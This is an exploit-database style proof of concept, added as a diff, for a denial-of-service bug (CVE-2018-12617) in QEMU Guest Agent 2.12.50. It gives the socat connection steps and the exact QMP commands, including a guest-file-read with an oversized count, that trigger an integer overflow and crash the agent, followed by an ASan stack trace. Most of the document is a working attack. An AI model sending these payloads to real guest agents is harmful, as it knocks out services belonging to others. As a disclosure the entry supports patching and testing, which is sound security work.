@@ -1,0 +1,46 @@
+# Exploit Title: QEMU Guest Agent 2.12.50 - Denial of Service
+# Date: 2018-06-07
+# Exploit Author: Fakhri Zulkifli (@d0lph1n98)
+# Vendor Homepage: https://www.qemu.org/
+# Software Link: https://www.qemu.org/download/
+# Version: 2.12.50 and earlier
+# Tested on: 2.12.50
+# CVE : CVE-2018-12617
+
+# QEMU Guest Agent 2.12.50 and earlier has an integer overflow causing a g_malloc0() 
+# call to trigger a segfault() call when trying to allocate a large memory chunk. 
+# The vulnerability can be exploited by sending a specific QMP command to 
+# the agent via the listening socket.
+
+1st, execute the guest-agent using the following command:
+
+$ qemu-ga -m unix-listen -p /tmp/qga.sock -t /tmp
+
+2nd, on the other console, connect to the UNIX socket using socat:
+
+$ socat unix-connect:/tmp/qga.sock -
+
+3rd, enter the following QMP command:
+
+{"execute":"guest-file-open", "arguments":{"path":"/tmp/poc","mode":"w+”}}
+{"return": 1000}
+{"execute":"guest-file-read", "arguments":{"handle":1000,"count":4294967295}}
+
+The guest-file-read must be specified with the correct handle value (file descriptor). Different files will have different handle value.
+
+#0 0x5598eed0a1af in calloc /home/user/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:107
+#1 0x7f2ce5d7d770 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4f770)
+#2 0x5598eed84996 in qmp_marshal_guest_file_read /home/user/qemu/qga/qapi-generated/qga-qapi-commands.c:425:14
+#3 0x5598eeda4fcf in do_qmp_dispatch /home/user/qemu/qapi/qmp-dispatch.c:119:5
+#4 0x5598eeda4fcf in qmp_dispatch /home/user/qemu/qapi/qmp-dispatch.c:168
+#5 0x5598eed59bff in process_command /home/user/qemu/qga/main.c:589:11
+#6 0x5598eed59bff in process_event /home/user/qemu/qga/main.c:626
+#7 0x5598eedb5f13 in json_message_process_token /home/user/qemu/qobject/json-streamer.c:105:5
+#8 0x5598eee25d9b in json_lexer_feed_char /home/user/qemu/qobject/json-lexer.c:323:13
+#9 0x5598eee25333 in json_lexer_feed /home/user/qemu/qobject/json-lexer.c:373:15
+#10 0x5598eed5a95e in channel_event_cb /home/user/qemu/qga/main.c:659:9
+#11 0x5598eed710c1 in ga_channel_client_event /home/user/qemu/qga/channel-posix.c:92:23
+#12 0x7f2ce5d78049 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a049)
+
+# References:
+# 1. https://lists.gnu.org/archive/html/qemu-devel/2018-06/msg03385.html
